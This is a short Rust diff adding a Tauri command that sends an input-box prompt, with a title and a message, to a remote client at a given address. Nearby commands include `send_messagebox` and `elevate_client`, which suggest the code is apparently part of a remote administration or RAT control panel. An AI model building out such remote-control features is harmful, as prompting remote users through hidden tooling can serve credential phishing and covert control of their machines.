@@ -502,6 +502,31 @@ pub async fn send_messagebox(
 }
 
 #[tauri::command]
+pub async fn send_inputbox(
+    addr: &str,
+    title: &str,
+    message: &str,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {
+    send_server_command(
+        ServerCommand::ShowInputBox(
+            addr.parse().unwrap(),
+            common::packets::InputBoxData {
+                title: title.to_string(),
+                message: message.to_string(),
+            },
+        ),
+        tauri_state,
+        app_handle,
+    )
+    .await?;
+
+    Ok("Inputbox sent".to_string())
+}
+
+
+#[tauri::command]
 pub async fn elevate_client(
     addr: &str,
     tauri_state: State<'_, SharedTauriState>,
